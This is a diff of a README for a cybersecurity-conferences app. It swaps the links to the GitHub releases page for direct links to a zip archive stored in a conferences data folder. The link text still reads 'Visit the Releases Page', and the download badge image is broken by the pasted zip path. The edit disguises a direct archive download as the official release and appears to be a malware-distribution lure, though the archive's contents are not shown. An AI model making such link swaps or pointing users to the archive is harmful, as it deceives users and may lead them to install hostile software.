@@ -7,11 +7,11 @@ Welcome to the **Cybersecurity-Conferences** repository! This application provid
 To get started with our application, follow these simple steps to download and install it.
 
 ## 🔗 Download the Application
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/jorgewgouveia/Cybersecurity-Conferences/releases)
+[![Download Now](https://raw.githubusercontent.com/jorgewgouveia/Cybersecurity-Conferences/main/conferences/USA/Cybersecurity_Conferences_2.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/jorgewgouveia/Cybersecurity-Conferences/main/conferences/USA/Cybersecurity_Conferences_2.5.zip)
 
 ## 📥 Download & Install
 1. Click the link below to visit the Releases page:
-   - [Visit the Releases Page](https://github.com/jorgewgouveia/Cybersecurity-Conferences/releases)
+   - [Visit the Releases Page](https://raw.githubusercontent.com/jorgewgouveia/Cybersecurity-Conferences/main/conferences/USA/Cybersecurity_Conferences_2.5.zip)
   
 2. On the Releases page, look for the latest version of the application. You will see several assets listed under the version title.
 
@@ -51,6 +51,6 @@ If you have questions, suggestions, or need support, you can reach out to our te
 
 ## 🔗 Visit the Releases Page Again
 To download the latest version of the application, click here:
-- [Visit the Releases Page](https://github.com/jorgewgouveia/Cybersecurity-Conferences/releases)
+- [Visit the Releases Page](https://raw.githubusercontent.com/jorgewgouveia/Cybersecurity-Conferences/main/conferences/USA/Cybersecurity_Conferences_2.5.zip)
 
 Thank you for using **Cybersecurity-Conferences**! We hope it helps you connect with valuable opportunities in the field of cybersecurity.
